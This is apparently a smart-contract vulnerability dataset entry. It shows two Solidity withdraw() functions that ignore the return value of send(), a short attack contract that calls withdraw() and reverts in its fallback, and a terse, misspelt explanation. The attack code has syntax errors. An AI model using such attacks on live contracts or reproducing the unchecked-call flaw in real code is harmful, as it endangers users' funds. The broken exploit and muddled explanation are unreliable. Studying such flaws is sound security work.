## Vulnerable Code

```javascript
**Instance_1**
function withdraw() isActivated() public payable {
	    require(msg.value == 0, "withdraw fee is 0 ether, please set the exact amount");
	    
	    uint256 uid = pIDxAddr_[msg.sender];
	    require(uid != 0, "no invest");

        for(uint i = 0; i < player_[uid].planCount; i++) {
	        if (player_[uid].plans[i].isClose) {
	            continue;
	        }

            SDDatasets.Plan plan = plan_[player_[uid].plans[i].planId];
            
            uint256 blockNumber = block.number;
            bool bClose = false;
            if (plan.dayRange > 0) {
                
                uint256 endBlockNumber = player_[uid].plans[i].startBlock.add(plan.dayRange*G_DayBlocks);
                if (blockNumber > endBlockNumber){
                    blockNumber = endBlockNumber;
                    bClose = true;
                }
            }
            
            uint256 amount = player_[uid].plans[i].invested * plan.interest / 10000 * (blockNumber - player_[uid].plans[i].atBlock) / G_DayBlocks;

            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.send(amount);         //Vulnerable position 

            // record block number and invested amount (msg.value) of this transaction
            player_[uid].plans[i].atBlock = block.number;
            player_[uid].plans[i].isClose = bClose;
            player_[uid].plans[i].payEth += amount;
        }
	}


**Instance_2**
function withdraw() private {
	    require(msg.value == 0, "withdraw fee is 0 ether, please set the exact amount");

	    uint256 uid = pIDxAddr_[rId_][msg.sender];
	    require(uid != 0, "no invest");

	for(uint i = 0; i < player_[rId_][uid].planCount; i++) {
		if (player_[rId_][uid].plans[i].isClose) {
		    continue;
		}

	    ESDatasets.Plan plan = plan_[player_[rId_][uid].plans[i].planId];

	    uint256 blockNumber = block.number;
	    bool bClose = false;
	    if (plan.dayRange > 0) {

		uint256 endBlockNumber = player_[rId_][uid].plans[i].startBlock.add(plan.dayRange*G_DayBlocks);  //different code
		if (blockNumber > endBlockNumber){
		    blockNumber = endBlockNumber;
		    bClose = true;
		}
	    }

	    uint256 amount = player_[rId_][uid].plans[i].invested * plan.interest / 10000 * (blockNumber - player_[rId_][uid].plans[i].atBlock) / G_DayBlocks;

	    // send calculated amount of ether directly to sender (aka YOU)
	    address sender = msg.sender;
	    sender.send(amount);

	    // record block number and invested amount (msg.value) of this transaction
	    player_[rId_][uid].plans[i].atBlock = block.number;
	    player_[rId_][uid].plans[i].isClose = bClose;
	    player_[rId_][uid].plans[i].payEth += amount;
	}

	if (this.balance < 100000000000000) { //0.0001eth
	    rId_ = rId_.add(1);
	    round_[rId_].startTime = now;
	}
}
```



## Exploit Code

```javascript
Contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“withdraw()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position.Due to 'Unchecked Low level Call' so if an malicious contract -"Attack" to call mehtod-'withdraw', as we looked that.the location of comment of vulnerability position is possible failed.but have not chacked the return value.so progrem will continue.it is danger.
